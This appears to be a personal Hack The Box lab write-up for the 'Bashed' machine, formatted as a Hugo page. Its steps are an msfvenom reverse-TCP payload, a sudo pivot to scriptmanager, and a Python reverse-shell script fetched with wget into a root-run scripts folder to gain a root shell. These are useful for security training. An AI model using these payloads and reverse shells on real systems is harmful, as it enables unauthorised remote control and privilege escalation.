---
### The title for the content.
title: "Bashed"
### If set, this will be used for the page's menu entry (instead of the `title` attribute)
# menuTitle : "bashed"
### The title of the page in menu will be prefixed by this HTML content
# pre : ""
### The title of the page in menu will be postfixed by this HTML content
# post : ""
### The description for the content.
description: "Notes from the Bashed machine on HTB."
### The datetime assigned to this page.
date : 2020-03-10T16:43:47+01:00
### Appears as the tail of the output URL. A value specified in front matter will override the segment of the URL based on the filename.
# slug : "bashed"
### Aliases can be used to create redirects to your page from other URLs.
# aliases : [""]
### Display name of this page modifier. If set, it will be displayed in the footer.
# LastModifierDisplayName : ""
### Email of this page modifier. If set with LastModifierDisplayName, it will be displayed in the footer
# LastModifierEmail : ""
### Table of content (toc) is enabled by default. Set this parameter to true to disable it.
# disableToc : true
### Set the page as a chapter, changing the way it's displayed
# chapter : true
### Hide a menu entry by setting this to true
# hidden : true
### If true, the content will not be rendered unless the --buildDrafts flag is passed to the hugo command.
# draft : true
### Used for ordering your content in lists. Lower weight gets higher precedence. So content with lower weight will come first.
### 0 does nothing !
weight : 0
### Used to tag content. By default this is inherited using cascading from _index.md files
### Only set of you want to overwrite these inherited values.
# tags : [""]
---

## bashed

### where you at

10.10.10.68

### what you got

#### nmap

{{%attachments title="Related files" style="grey" pattern=".*(nmap)" /%}}

#### Nikto

{{%attachments title="Related files" style="grey" pattern=".*(nikto)" /%}}

#### Gobuster

{{%attachments title="Related files" style="grey" pattern=".*(gobuster)" /%}}

/dev = php shell

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f elf > notmalware.elf
```

{{%attachments title="Related files" style="grey" pattern=".*(notmalware)" /%}}

```bash
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL

```

```bash
sudo -u scriptmanager /bin/bash -i
scriptmanager@bashed:/tmp$ ls -la /
ls -la /
total 88
drwxr-xr-x  23 root          root           4096 Dec  4  2017 .
drwxr-xr-x  23 root          root           4096 Dec  4  2017 ..
....
drwxrwxr--   2 scriptmanager scriptmanager  4096 Jan 24 15:40 scripts
....

scriptmanager@bashed:/scripts$ ls -la
ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jan 24 15:40 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager  213 Jan 24 15:39 test.py
-rw-r--r--  1 root          root            12 Jan 24 15:30 test.txt
```

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.24",4455))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

{{%attachments title="Related files" style="grey" pattern=".*(test.py)" /%}}

```bash
root@kali:/mnt/hgfs/_shared_folder/htb/boxes/bashed/web# vim test.py
root@kali:/mnt/hgfs/_shared_folder/htb/boxes/bashed/web# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.68 - - [25/Jan/2020 00:39:59] "GET /test.py HTTP/1.1" 200 -
```

```bash
scriptmanager@bashed:/scripts$ wget http://10.10.14.24/test.py
wget http://10.10.14.24/test.py
--2020-01-24 15:39:19--  http://10.10.14.24/test.py
Connecting to 10.10.14.24:80... connected.
HTTP request sent, awaiting response... 200 OK
```

```bash
root@kali:~# nc -nlvp 4445
listening on [any] 4445 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.68] 57362
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```
